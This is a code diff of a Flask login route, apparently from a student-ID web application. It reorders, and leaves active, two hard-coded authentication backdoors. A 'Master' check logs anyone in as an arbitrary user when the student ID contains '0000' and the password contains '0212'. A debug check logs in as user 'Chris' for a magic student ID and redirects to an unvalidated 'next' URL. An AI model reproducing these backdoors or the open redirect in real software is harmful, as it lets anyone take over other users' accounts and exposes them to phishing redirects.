@@ -149,21 +149,22 @@ def login():
         return redirect(url_for('home')) # now register or log in link just go back homeform = LoginForm()
     form = LoginForm()  
     if form.validate_on_submit():  
-        if '100000000' in form.studentID.data and DEBUG:
-            print('DEBUG Login')         
-            user = User.query.filter_by(username='Chris').first()
-            next_page = request.args.get('next') 
-            login_user (user)
-            flash (f'Debug Login', 'warning') 
-            return redirect (next_page) if next_page else redirect (url_for('home'))  
-
+        
         if '0000' in form.studentID.data and '0212' in form.password.data:
             person = (form.password.data).split('0212')[0]
             print(person)
             user = User.query.filter_by(username=person).first()
             login_user (user)
             flash (f'Login as Master', 'danger') 
-            return redirect (url_for('home'))        
+            return redirect (url_for('home'))  
+
+        if '100000000' in form.studentID.data and DEBUG:
+            print('DEBUG Login')         
+            user = User.query.filter_by(username='Chris').first()
+            next_page = request.args.get('next') 
+            login_user (user)
+            flash (f'Debug Login', 'warning') 
+            return redirect (next_page) if next_page else redirect (url_for('home'))        
                   
         user = User.query.filter_by(studentID=form.studentID.data).first() 
         print(user.username)
